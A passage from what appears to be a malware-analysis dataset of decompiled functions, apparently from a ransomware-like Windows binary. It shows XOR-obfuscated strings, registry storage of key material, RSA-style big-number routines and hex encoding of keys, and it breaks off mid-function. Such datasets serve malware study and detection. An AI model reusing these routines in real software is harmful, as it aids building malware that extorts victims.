        "decompiled_code": "\nint32_t __cdecl\nfcn.004083a0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_ch;\n    \n    iVar2 = 0;\n    fcn.00403700(&var_ch);\n    fcn.00403700(&var_18h);\n    if ((arg_1ch == 0) ||\n       (((arg_ch == 0 || (iVar2 = fcn.00403cd0(arg_ch, 0x32, arg_1ch, arg_20h),  iVar2 == 0)) &&\n        ((arg_10h == 0 || (iVar2 = fcn.00403cd0(arg_10h, 0x32, arg_1ch, arg_20h),  iVar2 == 0)))))) {\n        if ((arg_ch == 0) || (arg_10h == 0)) {\ncode_r0x0040846c:\n            if (((arg_8h != 0) && ((arg_14h != 0 && (arg_18h != 0)))) &&\n               ((iVar1 = fcn.00402060(arg_14h, 1),  iVar1 < 1 ||\n                (((iVar1 = fcn.00402060(arg_18h, 1),  iVar1 < 1 || (iVar1 = fcn.004020a0(arg_14h, arg_8h),  -1 < iVar1))\n                 || (iVar1 = fcn.004020a0(arg_18h, arg_8h),  -1 < iVar1)))))) goto code_r0x004085fc;\n        }\n        else if (arg_8h != 0) {\n            iVar2 = fcn.00404130(&var_ch, arg_ch, arg_10h);\n            if (iVar2 != 0) goto code_r0x00408601;\n            iVar1 = fcn.00402060(arg_8h, 1);\n            if ((iVar1 < 1) || (iVar1 = fcn.004020a0(&var_ch, arg_8h),  iVar1 != 0)) goto code_r0x004085fc;\n            goto code_r0x0040846c;\n        }\n        if ((((arg_ch == 0) || (arg_10h == 0)) || ((arg_14h == 0 || (arg_18h == 0)))) ||\n           (((iVar2 = fcn.00402060(arg_ch, 1),  0 < iVar2 && (iVar2 = fcn.00402060(arg_10h, 1),  0 < iVar2)) &&\n            ((iVar2 = fcn.00404130(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n             ((((iVar2 = fcn.00404730(&var_ch, &var_ch, 1),  iVar2 != 0 ||\n                (iVar2 = fcn.00404730(&var_18h, arg_ch, 1),  iVar2 != 0)) ||\n               (iVar2 = fcn.00403f50(&var_ch, &var_ch, &var_18h),  iVar2 != 0)) ||\n              ((iVar2 = fcn.00402060(&var_ch, 0),  iVar2 == 0 &&\n               (((iVar2 = fcn.00404130(&var_ch, arg_14h, arg_18h),  iVar2 != 0 ||\n                 (iVar2 = fcn.00404730(&var_ch, &var_ch, 1),  iVar2 != 0)) ||\n                ((iVar2 = fcn.00404730(&var_18h, arg_10h, 1),  iVar2 != 0 ||\n                 ((iVar2 = fcn.00403f50(&var_ch, &var_ch, &var_18h),  iVar2 != 0 ||\n                  (iVar1 = fcn.00402060(&var_ch, 0),  iVar1 == 0)))))))))))))))) goto code_r0x00408601;\n    }\ncode_r0x004085fc:\n    iVar2 = -0x4200;\ncode_r0x00408601:\n    fcn.00402ff0(&var_ch);\n    fcn.00402ff0(&var_18h);\n    if ((iVar2 == 0) || (iVar1 = iVar2 + -0x4200,  iVar2 == -0x4200)) {\n        iVar1 = iVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 1052
    },
    "00408640": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00408640(void)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint uVar4;\n    uint uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    code *pcVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    int32_t iVar15;\n    uint uVar16;\n    uint var_878h;\n    uint var_670h;\n    uint var_52eh;\n    uint uStack1326;\n    uint uStack1322;\n    uint uStack1318;\n    uint var_51eh;\n    uint uStack1310;\n    uint uStack1306;\n    uint uStack1302;\n    uint var_50eh;\n    uint uStack1294;\n    uint uStack1290;\n    uint uStack1286;\n    uint var_4feh;\n    uint uStack1278;\n    uint uStack1274;\n    uint uStack1270;\n    uint var_4eeh;\n    uint uStack1262;\n    uint uStack1258;\n    uint uStack1254;\n    uint var_4deh;\n    uint uStack1246;\n    uint uStack1242;\n    uint uStack1238;\n    uint var_4ceh;\n    uint uStack1230;\n    uint uStack1226;\n    uint uStack1222;\n    uint var_4beh;\n    uint uStack1214;\n    uint uStack1210;\n    uint uStack1206;\n    uint var_4aeh;\n    uint uStack1198;\n    uint uStack1194;\n    uint uStack1190;\n    uint var_49eh;\n    uint uStack1182;\n    uint uStack1178;\n    uint uStack1174;\n    uint var_48eh;\n    uint uStack1166;\n    uint uStack1162;\n    uint uStack1158;\n    uint var_47eh;\n    uint uStack1150;\n    uint uStack1146;\n    uint uStack1142;\n    uint var_46eh;\n    uint uStack1134;\n    uint uStack1130;\n    uint uStack1126;\n    uint var_45eh;\n    uint uStack1118;\n    uint uStack1114;\n    uint uStack1110;\n    uint var_44eh;\n    uint uStack1102;\n    uint uStack1098;\n    uint uStack1094;\n    uint var_43eh;\n    uint uStack1086;\n    uint uStack1082;\n    uint uStack1078;\n    uint var_42eh;\n    uint uStack1070;\n    uint uStack1066;\n    uint uStack1062;\n    uint var_41eh;\n    uint uStack1054;\n    uint uStack1050;\n    uint uStack1046;\n    uint var_40eh;\n    uint uStack1038;\n    uint uStack1034;\n    uint uStack1030;\n    uint var_3feh;\n    uint uStack1022;\n    uint uStack1018;\n    uint uStack1014;\n    uint var_3eeh;\n    uint uStack1006;\n    uint uStack1002;\n    uint uStack998;\n    uint var_3deh;\n    uint uStack990;\n    uint uStack986;\n    uint uStack982;\n    uint var_3ceh;\n    uint uStack974;\n    uint uStack970;\n    uint uStack966;\n    uint var_3beh;\n    uint uStack958;\n    uint uStack954;\n    uint uStack950;\n    uint var_3aeh;\n    uint uStack942;\n    uint uStack938;\n    uint uStack934;\n    uint var_39eh;\n    uint uStack926;\n    uint uStack922;\n    uint uStack918;\n    uint var_38eh;\n    uint uStack910;\n    uint uStack906;\n    uint uStack902;\n    uint var_37eh;\n    uint uStack894;\n    uint uStack890;\n    uint uStack886;\n    uint var_36eh;\n    uint uStack878;\n    uint uStack874;\n    uint uStack870;\n    uint var_35eh;\n    uint uStack862;\n    uint uStack858;\n    uint uStack854;\n    uint var_34eh;\n    uint uStack846;\n    uint uStack842;\n    uint uStack838;\n    uint var_33eh;\n    uint uStack830;\n    uint uStack826;\n    uint uStack822;\n    uint var_32eh;\n    uint uStack814;\n    uint uStack810;\n    uint uStack806;\n    uint var_31eh;\n    uint uStack798;\n    uint uStack794;\n    uint uStack790;\n    uint var_30eh;\n    uint uStack782;\n    uint uStack778;\n    uint uStack774;\n    uint var_2feh;\n    uint uStack766;\n    uint uStack762;\n    uint uStack758;\n    uint var_2eeh;\n    uint uStack750;\n    uint uStack746;\n    uint uStack742;\n    uint var_2deh;\n    uint uStack734;\n    uint uStack730;\n    uint uStack726;\n    uint var_2ceh;\n    uint uStack718;\n    uint uStack714;\n    uint uStack710;\n    uint var_2beh;\n    uint uStack702;\n    uint uStack698;\n    uint uStack694;\n    uint var_2aeh;\n    uint uStack686;\n    uint uStack682;\n    uint uStack678;\n    uint var_29eh;\n    uint uStack670;\n    uint uStack666;\n    uint uStack662;\n    uint var_28eh;\n    uint uStack654;\n    uint uStack650;\n    uint uStack646;\n    uint var_27eh;\n    uint uStack638;\n    uint uStack634;\n    uint uStack630;\n    uint var_26eh;\n    uint uStack622;\n    uint uStack618;\n    uint uStack614;\n    uint var_25eh;\n    ushort var_25ah;\n    uchar var_258h;\n    uint var_257h;\n    uint uStack599;\n    uint uStack595;\n    uint uStack591;\n    uint var_247h;\n    uint uStack583;\n    uint uStack579;\n    uint uStack575;\n    uint var_237h;\n    uint uStack567;\n    uint uStack563;\n    uint uStack559;\n    uint var_227h;\n    uint uStack551;\n    uint uStack547;\n    uint uStack543;\n    uint var_217h;\n    uint uStack535;\n    uint uStack531;\n    uint uStack527;\n    uint var_207h;\n    uint uStack519;\n    uint uStack515;\n    uint uStack511;\n    uint var_1f7h;\n    uint uStack503;\n    uint uStack499;\n    uint uStack495;\n    uint var_1e7h;\n    uint uStack487;\n    uint uStack483;\n    uint uStack479;\n    uint var_1d7h;\n    uint uStack471;\n    uint uStack467;\n    uint uStack463;\n    uint var_1c7h;\n    uint uStack455;\n    uint uStack451;\n    uint uStack447;\n    uint var_1b7h;\n    uint uStack439;\n    uint uStack435;\n    uint uStack431;\n    uint var_1a7h;\n    uint uStack423;\n    uint uStack419;\n    uint uStack415;\n    uint var_197h;\n    uint uStack407;\n    uint uStack403;\n    uint uStack399;\n    uint var_187h;\n    uint uStack391;\n    uint uStack387;\n    uint uStack383;\n    uint var_177h;\n    uint uStack375;\n    uint uStack371;\n    uint uStack367;\n    uint var_167h;\n    uint uStack359;\n    uint uStack355;\n    uint uStack351;\n    uint var_157h;\n    uint uStack343;\n    uint uStack339;\n    uint uStack335;\n    uint var_147h;\n    uint uStack327;\n    uint uStack323;\n    uint uStack319;\n    uint var_137h;\n    uint uStack311;\n    uint uStack307;\n    uint uStack303;\n    uint var_127h;\n    uint uStack295;\n    uint uStack291;\n    uint uStack287;\n    uint var_117h;\n    uint uStack279;\n    uint uStack275;\n    uint uStack271;\n    uint var_107h;\n    uint uStack263;\n    uint uStack259;\n    uint uStack255;\n    uint var_f7h;\n    uint uStack247;\n    uint uStack243;\n    uint uStack239;\n    uint var_e7h;\n    uint var_e3h;\n    uint var_dfh;\n    ushort var_dbh;\n    uchar var_d9h;\n    uint var_d8h;\n    uint var_cch;\n    uint var_c0h;\n    uint var_8bh;\n    uint uStack139;\n    uint uStack135;\n    uint uStack131;\n    uint var_7bh;\n    uint uStack123;\n    uint uStack119;\n    uint uStack115;\n    uint var_6bh;\n    uchar var_67h;\n    uint var_66h;\n    uint uStack102;\n    uint uStack98;\n    uint uStack94;\n    uint var_56h;\n    uint var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_20h;\n    uchar var_1fh;\n    uchar var_1eh;\n    uchar var_1dh;\n    uint var_1ch;\n    uint var_24h;\n    uint var_15h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uint var_eh;\n    uchar var_ah;\n    uchar var_9h;\n    uint hKey;\n    uchar *ptr;\n    \n    ptr = (*_sym.imp.msvcrt.dll_malloc)(0x483);\n    bVar6 = false;\n    while( true ) {\n        uVar10 = 0;\n        var_66h = *0x424570;\n        uStack102 = *0x424574;\n        uStack98 = *0x424578;\n        uStack94 = *0x42457c;\n        var_56h._0_2_ = 0x16;\n        do {\n            var_66h._0_1_ = *0x424570;\n            puVar2 = &var_66h + uVar10 + 1;\n            *puVar2 = *puVar2 ^ var_66h;\n            uVar10 = uVar10 + 1;\n        } while (uVar10 < 0x10);\n        var_56h._0_2_ = var_56h & 0xff;\n        uVar16 = 0x80000001;\n        iVar11 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                           (0x80000001, &var_66h + 1, 0, 0, 0, 0xf003f, 0, &hKey, &var_4ch);\n        if (iVar11 != 0) {\n            uVar10 = 0;\n            var_48h = *0x4244f0;\n            uStack72 = *0x4244f4;\n            uStack68 = *0x4244f8;\n            uStack64 = *0x4244fc;\n            var_38h = 0xb400e0f;\n            var_34h = 0x131905;\n            do {\n                var_48h._0_1_ = *0x4244f0;\n                puVar2 = &var_48h + uVar10 + 1;\n                *puVar2 = *puVar2 ^ var_48h;\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x16);\n            var_34h = var_34h & 0xffffff;\n            fcn.0040a0b0(&var_48h + 1, uVar16);\n            iVar11 = fcn.00409200();\n            if (iVar11 == 0) {\n                return 0;\n            }\n            stack0xffffffa8 = 0x483;\n            iVar11 = fcn.00409030();\n            if (iVar11 == 0) {\n                return 0;\n            }\n            goto code_r0x0040890d;\n        }\n        var_eh._0_1_ = 0x22;\n        var_30h = 3;\n        var_28h = 0x500;\n        var_eh._1_1_ = 0x66;\n        var_9h = 0;\n        var_eh._3_1_ = 0x6c;\n        var_ah = 0x6c;\n        var_eh._2_1_ = 0x75;\n        iVar11 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_eh + 1, 0, &var_30h, 0x428960, &var_28h);\n        var_28h = 0x103;\n        var_1ch._0_1_ = 0x34;\n        var_15h._0_1_ = 0;\n        var_1ch._1_1_ = 0x50;\n        var_1ch._2_1_ = 0x75;\n        var_1ch._3_1_ = 0x62;\n        uVar16 = hKey;\n        iVar12 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_1ch + 1, 0, &var_30h, ptr, &var_28h);\n        if ((iVar11 == 0) && (iVar12 == 0)) {\n            uVar10 = 0;\n            var_8bh = *0x424670;\n            uStack139 = *0x424674;\n            uStack135 = *0x424678;\n            uStack131 = *0x42467c;\n            var_6bh = 0xb000601;\n            var_7bh = *0x424660;\n            uStack123 = *0x424664;\n            uStack119 = *0x424668;\n            uStack115 = *0x42466c;\n            var_67h = 0;\n            do {\n                var_8bh._0_1_ = *0x424670;\n                puVar2 = &var_8bh + uVar10 + 1;\n                *puVar2 = *puVar2 ^ var_8bh;\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x23);\n            var_67h = 0;\n            fcn.0040a0b0(&var_8bh + 1, uVar16);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            goto code_r0x0040890d;\n        }\n        if ((var_4ch != 2) || (bVar6)) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        bVar6 = true;\n    }\n    iVar11 = fcn.00409200();\n    if (iVar11 != 0) {\n        var_50h = 0x483;\n        iVar11 = fcn.00409030();\n        pcVar8 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n        if (iVar11 != 0) {\n            var_15h._1_1_ = 0xc;\n            var_fh = 0;\n            var_15h._2_1_ = 0x66;\n            var_15h._3_1_ = 0x75;\n            var_11h = 0x6c;\n            var_10h = 0x6c;\n            (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &var_15h + 2, 0, 3, 0x428960, 0x500);\n            var_1dh = 0;\n            var_1fh = 0x69;\n            var_20h = 0x6c;\n            var_1eh = 99;\n            (*pcVar8)(hKey, &var_24h + 1, 0, 3, ptr, 0x103);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\ncode_r0x0040890d:\n            fcn.00403700(&var_d8h);\n            fcn.00403700(&var_cch);\n            fcn.004059f0(0x428e68, 0, 0);\n            iVar11 = fcn.00404300(&var_d8h, ptr, 0x100);\n            if (((iVar11 == 0) && (iVar11 = fcn.00404300(&var_cch, ptr + 0x100, 3),  iVar11 == 0)) &&\n               (iVar11 = fcn.00405940(0x428e68, &var_d8h, 0, 0, 0, &var_cch),  iVar11 == 0)) {\n                fcn.00401a70(&var_670h);\n                fcn.00401710(&var_878h);\n                var_257h = *0x424bb0;\n                uStack599 = *0x424bb4;\n                uStack595 = *0x424bb8;\n                uStack591 = *0x424bbc;\n                uVar10 = 0;\n                var_e7h = 0x40435b59;\n                var_247h = *0x424870;\n                uStack583 = *0x424874;\n                uStack579 = *0x424878;\n                uStack575 = *0x42487c;\n                var_e3h = 0x4203465a;\n                var_237h = *0x424b90;\n                uStack567 = *0x424b94;\n                uStack563 = *0x424b98;\n                uStack559 = *0x424b9c;\n                var_dfh = 0x43424443;\n                var_227h = *0x424c60;\n                uStack551 = *0x424c64;\n                uStack547 = *0x424c68;\n                uStack543 = *0x424c6c;\n                var_dbh = 0x1202;\n                var_217h = *0x424b80;\n                uStack535 = *0x424b84;\n                uStack531 = *0x424b88;\n                uStack527 = *0x424b8c;\n                var_d9h = 0;\n                var_207h = *0x424bc0;\n                uStack519 = *0x424bc4;\n                uStack515 = *0x424bc8;\n                uStack511 = str._L_Y_wqn._0_4_;\n                var_1f7h = *0x4245a0;\n                uStack503 = *0x4245a4;\n                uStack499 = *0x4245a8;\n                uStack495 = *0x4245ac;\n                var_1e7h = *0x424b60;\n                uStack487 = *0x424b64;\n                uStack483 = *0x424b68;\n                uStack479 = *0x424b6c;\n                var_1d7h = *0x424e80;\n                uStack471 = *0x424e84;\n                uStack467 = *0x424e88;\n                uStack463 = *0x424e8c;\n                var_1c7h = *0x424d70;\n                uStack455 = *0x424d74;\n                uStack451 = *0x424d78;\n                uStack447 = *0x424d7c;\n                var_1b7h = *0x424c10;\n                uStack439 = *0x424c14;\n                uStack435 = *0x424c18;\n                uStack431 = *0x424c1c;\n                var_1a7h = *0x424590;\n                uStack423 = *0x424594;\n                uStack419 = *0x424598;\n                uStack415 = *0x42459c;\n                var_197h = *0x424850;\n                uStack407 = *0x424854;\n                uStack403 = *0x424858;\n                uStack399 = *0x42485c;\n                var_187h = *0x424930;\n                uStack391 = *0x424934;\n                uStack387 = *0x424938;\n                uStack383 = *0x42493c;\n                var_177h = *0x4249d0;\n                uStack375 = *0x4249d4;\n                uStack371 = *0x4249d8;\n                uStack367 = *0x4249dc;\n                var_167h = *0x4247b0;\n                uStack359 = *0x4247b4;\n                uStack355 = *0x4247b8;\n                uStack351 = *0x4247bc;\n                var_157h = *0x4245b0;\n                uStack343 = *0x4245b4;\n                uStack339 = *0x4245b8;\n                uStack335 = *0x4245bc;\n                var_147h = *0x424830;\n                uStack327 = *0x424834;\n                uStack323 = *0x424838;\n                uStack319 = *0x42483c;\n                var_137h = *0x424880;\n                uStack311 = *0x424884;\n                uStack307 = *0x424888;\n                uStack303 = *0x42488c;\n                var_127h = *0x424a00;\n                uStack295 = *0x424a04;\n                uStack291 = *0x424a08;\n                uStack287 = *0x424a0c;\n                var_117h = *0x424860;\n                uStack279 = *0x424864;\n                uStack275 = *0x424868;\n                uStack271 = *0x42486c;\n                var_107h = *0x4248e0;\n                uStack263 = str._rO_BZH__r._0_4_;\n                uStack259 = str._rO_BZH__r._4_4_;\n                uStack255 = *0x4248ec;\n                var_f7h = *0x424680;\n                uStack247 = *0x424684;\n                uStack243 = *0x424688;\n                uStack239 = *0x42468c;\n                do {\n                    puVar2 = &var_257h + uVar10 + 1;\n                    *puVar2 = *puVar2 ^ *0x424bb0;\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < 0x17d);\n                var_52eh = *0x424910;\n                uStack1326 = *0x424914;\n                uStack1322 = *0x424918;\n                uStack1318 = *0x42491c;\n                var_d9h = 0;\n                var_51eh = str._b_bEUIK_aPHULT_aNI_asHU_v_WSLF_._4_4_;\n                uStack1310 = str._b_bEUIK_aPHULT_aNI_asHU_v_WSLF_._8_4_;\n                uStack1306 = str._b_bEUIK_aPHULT_aNI_asHU_v_WSLF_._12_4_;\n                uStack1302 = str._b_bEUIK_aPHULT_aNI_asHU_v_WSLF_._16_4_;\n                var_50eh = *0x424500;\n                uStack1294 = *0x424504;\n                uStack1290 = *0x424508;\n                uStack1286 = *0x42450c;\n                var_4feh = *0x424a70;\n                uStack1278 = *0x424a74;\n                uStack1274 = *0x424a78;\n                uStack1270 = *0x424a7c;\n                var_4eeh = *0x424a90;\n                uStack1262 = *0x424a94;\n                uStack1258 = *0x424a98;\n                uStack1254 = *0x424a9c;\n                var_4deh = *0x424460;\n                uStack1246 = *0x424464;\n                uStack1242 = *0x424468;\n                uStack1238 = *0x42446c;\n                var_4ceh = *0x4246f0;\n                uStack1230 = *0x4246f4;\n                uStack1226 = *0x4246f8;\n                uStack1222 = *0x4246fc;\n                var_4beh = *0x424990;\n                uStack1214 = *0x424994;\n                uStack1210 = *0x424998;\n                uStack1206 = *0x42499c;\n                var_4aeh = *0x4247f0;\n                uStack1198 = *0x4247f4;\n                uStack1194 = *0x4247f8;\n                uStack1190 = *0x4247fc;\n                var_49eh = *0x424ae0;\n                uStack1182 = *0x424ae4;\n                uStack1178 = *0x424ae8;\n                uStack1174 = *0x424aec;\n                var_48eh = *0x4249e0;\n                uStack1166 = *0x4249e4;\n                uStack1162 = *0x4249e8;\n                uStack1158 = *0x4249ec;\n                var_47eh = *0x424a80;\n                uStack1150 = *0x424a84;\n                uStack1146 = *0x424a88;\n                uStack1142 = *0x424a8c;\n                var_46eh = *0x4244d0;\n                uStack1134 = *0x4244d4;\n                uStack1130 = *0x4244d8;\n                uStack1126 = *0x4244dc;\n                var_45eh = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._20_4_;\n                uStack1118 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._24_4_;\n                uStack1114 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._28_4_;\n                uStack1110 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._32_4_;\n                var_44eh = *0x424c70;\n                uStack1102 = *0x424c74;\n                uStack1098 = *0x424c78;\n                uStack1094 = *0x424c7c;\n                var_43eh = *0x424a10;\n                uStack1086 = *0x424a14;\n                uStack1082 = *0x424a18;\n                uStack1078 = *0x424a1c;\n                var_42eh = *0x424800;\n                uStack1070 = *0x424804;\n                uStack1066 = *0x424808;\n                uStack1062 = *0x42480c;\n                var_41eh = *0x424b30;\n                uStack1054 = *0x424b34;\n                uStack1050 = *0x424b38;\n                uStack1046 = *0x424b3c;\n                var_40eh = *0x424820;\n                uStack1038 = *0x424824;\n                uStack1034 = *0x424828;\n                uStack1030 = *0x42482c;\n                var_3feh = *0x4247e0;\n                uStack1022 = *0x4247e4;\n                uStack1018 = *0x4247e8;\n                uStack1014 = *0x4247ec;\n                var_3eeh = *0x4244c0;\n                uStack1006 = *0x4244c4;\n                uStack1002 = *0x4244c8;\n                uStack998 = *0x4244cc;\n                var_3deh = str.ABB_aSH_aHRU._0_4_;\n                uStack990 = str.ABB_aSH_aHRU._4_4_;\n                uStack986 = *0x424408;\n                uStack982 = *0x42440c;\n                var_3ceh = *0x424c40;\n                uStack974 = *0x424c44;\n                uStack970 = *0x424c48;\n                uStack966 = *0x424c4c;\n                var_3beh = *0x424c30;\n                uStack958 = *0x424c34;\n                uStack954 = *0x424c38;\n                uStack950 = *0x424c3c;\n                var_3aeh = *0x4248b0;\n                uStack942 = *0x4248b4;\n                uStack938 = *0x4248b8;\n                uStack934 = *0x4248bc;\n                var_39eh = *0x4249b0;\n                uStack926 = *0x4249b4;\n                uStack922 = *0x4249b8;\n                uStack918 = *0x4249bc;\n                var_38eh = *0x424ab0;\n                uStack910 = *0x424ab4;\n                uStack906 = *0x424ab8;\n                uStack902 = str._b_bEUIK_aPHULT_aNI_asHU_v_WSLF_._0_4_;\n                var_37eh = *0x424a40;\n                uStack894 = *0x424a44;\n                uStack890 = *0x424a48;\n                uStack886 = *0x424a4c;\n                var_36eh = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._36_4_;\n                uStack878 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._40_4_;\n                uStack874 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._44_4_;\n                uStack870 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._48_4_;\n                var_35eh = *0x424cf0;\n                uStack862 = *0x424cf4;\n                uStack858 = *0x424cf8;\n                uStack854 = *0x424cfc;\n                var_34eh = *0x424810;\n                uStack846 = *0x424814;\n                uStack842 = *0x424818;\n                uStack838 = *0x42481c;\n                var_33eh = *0x424a50;\n                uStack830 = *0x424a54;\n                uStack826 = *0x424a58;\n                uStack822 = *0x424a5c;\n                var_32eh = *0x424520;\n                uStack814 = str._b_bSE_nJFIRFK_t_th._0_4_;\n                uStack810 = str._b_bSE_nJFIRFK_t_th._4_4_;\n                uStack806 = str._b_bSE_nJFIRFK_t_th._8_4_;\n                var_31eh = *0x4248f0;\n                uStack798 = *0x4248f4;\n                uStack794 = *0x4248f8;\n                uStack790 = *0x4248fc;\n                var_30eh = *0x424480;\n                uStack782 = *0x424484;\n                uStack778 = *0x424488;\n                uStack774 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._0_4_;\n                var_2feh = *0x424a30;\n                uStack766 = *0x424a34;\n                uStack762 = *0x424a38;\n                uStack758 = *0x424a3c;\n                var_2eeh = *0x424a20;\n                uStack750 = *0x424a24;\n                uStack746 = *0x424a28;\n                uStack742 = *0x424a2c;\n                var_2deh = *0x424470;\n                uStack734 = *0x424474;\n                uStack730 = *0x424478;\n                uStack726 = *0x42447c;\n                var_2ceh = *0x4248c0;\n                uStack718 = *0x4248c4;\n                uStack714 = *0x4248c8;\n                uStack710 = *0x4248cc;\n                var_2beh = *0x4248a0;\n                uStack702 = *0x4248a4;\n                uStack698 = *0x4248a8;\n                uStack694 = *0x4248ac;\n                uVar10 = 0;\n                var_2aeh = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._4_4_;\n                uStack686 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._8_4_;\n                uStack682 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._12_4_;\n                uStack678 = str._apB_aKNBIST_aWBUTHIFK_aDFRTB_aWBUJFIBIS_a_tHU__aHU_aRTB_asHU_a._16_4_;\n                var_25eh = 0x77636007;\n                var_29eh = *0x4249c0;\n                uStack670 = *0x4249c4;\n                uStack666 = *0x4249c8;\n                uStack662 = *0x4249cc;\n                var_25ah = 0x975;\n                var_28eh = *0x424890;\n                uStack654 = *0x424894;\n                uStack650 = *0x424898;\n                uStack646 = *0x42489c;\n                var_258h = 0;\n                var_27eh = *0x424960;\n                uStack638 = *0x424964;\n                uStack634 = *0x424968;\n                uStack630 = *0x42496c;\n                var_26eh = *0x424a60;\n                uStack622 = *0x424a64;\n                uStack618 = *0x424a68;\n                uStack614 = *0x424a6c;\n                do {\n                    puVar2 = &var_52eh + uVar10 + 1;\n                    *puVar2 = *puVar2 ^ *0x424910;\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < 0x2d5);\n                var_258h = 0;\n                var_257h._1_1_ = *0x424bb0 >> 8;\n                *0x42932c = 0;\n                while (var_257h._1_1_ != '\\0') {\n                    var_257h._1_1_ = *(&var_257h + *0x42932c + 2);\n                    *0x42932c = *0x42932c + 1;\n                }\n                var_52eh._1_1_ = *0x424910 >> 8;\n                iVar11 = 0;\n                while (var_52eh._1_1_ != '\\0') {\n                    var_52eh._1_1_ = *(&var_52eh + iVar11 + 2);\n                    iVar11 = iVar11 + 1;\n                }\n                *0x42932c = *0x42932c + iVar11 + 500;\n                iVar12 = (*_sym.imp.msvcrt.dll_malloc)(*0x42932c);\n                *0x428e60 = iVar12;\n                fcn.0040cc00(iVar12, 0, *0x42932c);\n                iVar11 = 0;\n                while (var_257h._1_1_ != '\\0') {\n                    var_257h._1_1_ = *(&var_257h + iVar11 + 2);\n                    iVar11 = iVar11 + 1;\n                }\n                fcn.0040cbe0(iVar12, &var_257h + 1, iVar11);\n                pcVar8 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n                var_2ch = 0x32;\n                iVar12 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(0x427000, 8, 4, &var_c0h, &var_2ch);\n                pcVar9 = _sym.imp.USER32.dll_CharUpperA;\n                if (iVar12 != 0) {\n                    iVar15 = 0;\n                    iVar12 = 0;\n                    while( true ) {\n                        iVar7 = 0;\n                        cVar3 = var_c0h;\n                        while (cVar3 != '\\0') {\n                            cVar3 = *(&var_c0h + iVar7 + 1);\n                            iVar7 = iVar7 + 1;\n                        }\n                        if (iVar7 <= iVar12) break;\n                        cVar3 = *(&var_c0h + iVar12);\n                        if ((cVar3 != ' ') && (cVar3 != '\\t')) {\n                            *(&var_c0h + iVar15) = cVar3;\n                            iVar15 = iVar15 + 1;\n                        }\n                        iVar12 = iVar12 + 1;\n                    }\n                    *(&var_c0h + iVar15) = 0;\n                    puVar13 = (*_sym.imp.USER32.dll_CharUpperA)(&var_c0h);\n                    uVar16 = puVar13[1];\n                    uVar4 = puVar13[2];\n                    uVar5 = puVar13[3];\n                    puVar1 = iVar11 + *0x428e60;\n                    *puVar1 = *puVar13;\n                    puVar1[1] = uVar16;\n                    puVar1[2] = uVar4;\n                    puVar1[3] = uVar5;\n                    var_2ch = 0x32;\n                    iVar12 = (*pcVar8)(ptr, 8, 4, &var_c0h, &var_2ch);\n                    if (iVar12 != 0) {\n                        iVar15 = 0;\n                        iVar12 = 0;\n                        while( true ) {\n                            iVar7 = 0;\n                            cVar3 = var_c0h;\n                            while (cVar3 != '\\0') {\n                                cVar3 = *(&var_c0h + iVar7 + 1);\n                                iVar7 = iVar7 + 1;\n                            }\n                            if (iVar7 <= iVar12) break;\n                            cVar3 = *(&var_c0h + iVar12);\n                            if ((cVar3 != ' ') && (cVar3 != '\\t')) {\n                                *(&var_c0h + iVar15) = cVar3;\n                                iVar15 = iVar15 + 1;\n                            }\n          